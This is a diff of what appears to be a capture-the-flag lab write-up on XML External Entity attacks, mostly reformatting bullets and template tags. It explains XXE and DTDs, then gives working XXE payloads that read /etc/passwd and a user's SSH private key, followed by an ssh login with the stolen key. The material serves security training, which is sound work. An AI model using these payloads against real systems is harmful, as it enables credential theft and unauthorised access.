@@ -131,24 +131,23 @@ Use `firefox` and the online tool `https://crackstation.net` to crack the `MD5` 
 ## Task 12 - [Severity 4] XML External Entity
 
 XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data.
-  - It allows to interact with any backend or external systems that the application can access and allow to read the file on that system.
-  - They can cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications.
-  - XXE may even enable port scanning and lead to remote code execution.
+- It allows to interact with any backend or external systems that the application can access and allow to read the file on that system.
+- They can cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application tomake requests to other applications.
+- XXE may even enable port scanning and lead to remote code execution.
 
 Two types of XXE attacks.
-  - In-band XXE attack can receive an immediate response to the XXE payload.
-  - Out-of-band XXE attacks (blind XXE), there is no immediate response from the web application and need to reflect the output of XXE payload to some other file or their own server.
+- In-band XXE attack can receive an immediate response to the XXE payload.
+- Out-of-band XXE attacks (blind XXE), there is no immediate response from the web application and need to reflect the output of XXE payload to some other file or their own server.
 
 
 ## Task 13 - [Severity 4] XML External Entity - eXtensible Markup Language
 
 XML (eXtensible Markup Language) is a markup language that defines set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data.
-
-  - XML is platform-independent and programming language independent.
-  - The data stored and transported using XML can be changed at any point in time without affecting the data presentation.
-  - XML allows validation using DTD (Document Type Definition) and Schema.
-  - XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesn’t require any conversion when transferred between different systems.
-  - XML document mostly starts with what is known as XML Prolog <?xml version="1.0" encoding="UTF-8"?>.
+- XML is platform-independent and programming language independent.
+- The data stored and transported using XML can be changed at any point in time without affecting the data presentation.
+- XML allows validation using DTD (Document Type Definition) and Schema.
+- XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesn’t require any conversion whentransferred between different systems.
+- XML document mostly starts with what is known as XML Prolog <?xml version="1.0" encoding="UTF-8"?>.
 
 
 ## Task 14 - [Severity 4] XML External Entity - DTD
@@ -156,7 +155,7 @@ XML (eXtensible Markup Language) is a markup language that defines set of rules 
 DTD defines the structure and the legal elements and attributes of an XML document.
 
 Example DTD file `note.dtd`.
-{% capture code %}{% raw %}<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>{% endraw %}{% endcapture %} {% include code.html code=code %}
+{% raw %}<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>{% endraw %}
 
 The type of elements in `note.dtd` file is as below.
 {% capture code %}{% raw %}!DOCTYPE note -  Defines a root element of the document named note
@@ -169,14 +168,14 @@ The type of elements in `note.dtd` file is as below.
 #PCDATA - Parseable Character DATA{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 Example `note.xml` file referring to `note.dtd`.
-{% capture code %}{% raw %}<?xml version="1.0" encoding="UTF-8"?>
+{% raw %}<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE note SYSTEM "note.dtd">
 <note>
     <to>falcon</to>
     <from>feast</from>
     <heading>hacking</heading>
     <body>XXE attack</body>
-</note>{% endraw %}{% endcapture %} {% include code.html code=code %}
+</note>{% endraw %}
 
 
 ## Task 15 - [Severity 4] XML External Entity - XXE Payload
@@ -196,14 +195,14 @@ Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds{% endraw %}{% endcap
 
 Use `firefox` to load url `http://<ip>` and try the below payloads.
 
-{% capture code %}{% raw %}<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+{% raw %}<!DOCTYPE replace [<!ENTITY name "feast"> ]>
     <userInfo>
         <firstName>falcon</firstName>
         <lastName>&name;</lastName>
-    </userInfo>{% endraw %}{% endcapture %} {% include code.html code=code %}
+    </userInfo>{% endraw %}
 
-{% capture code %}{% raw %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
-<root>&read;</root>{% endraw %}{% endcapture %} {% include code.html code=code %}
+{% raw %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>{% endraw %}
 
 The first payload will display `falcon feast` and the second payload will display contents of system file `/etc/passwd`.
 
@@ -213,12 +212,12 @@ The first payload will display `falcon feast` and the second payload will displa
 Use `firefox` to load the url `http://<ip>`
 
 Use the following payloads to get the contents of `/etc/passwd`.
-{% capture code %}{% raw %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
-<root>&read;</root>{% endraw %}{% endcapture %} {% include code.html code=code %}
+{% raw %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>{% endraw %}
 
 There is one non-system user. Use the following payload to read the user's rsa private key.
-{% capture code %}{% raw %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/<user>/.ssh/id_rsa'>]>
-<root>&read;</root>{% endraw %}{% endcapture %} {% include code.html code=code %}
+{% raw %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/<user>/.ssh/id_rsa'>]>
+<root>&read;</root>{% endraw %}
 
 Copy the contents of payload output to new file. Change the permission of the file to be more stricter, like `chmod 400 <user>_id_rsa` and use `ssh` to login to the machine using downloaded user's ssh private key.
 {% capture code %}{% raw %}ssh -i <user>_id_rsa <user>@<ip>{% endraw %}{% endcapture %} {% include code.html code=code %}
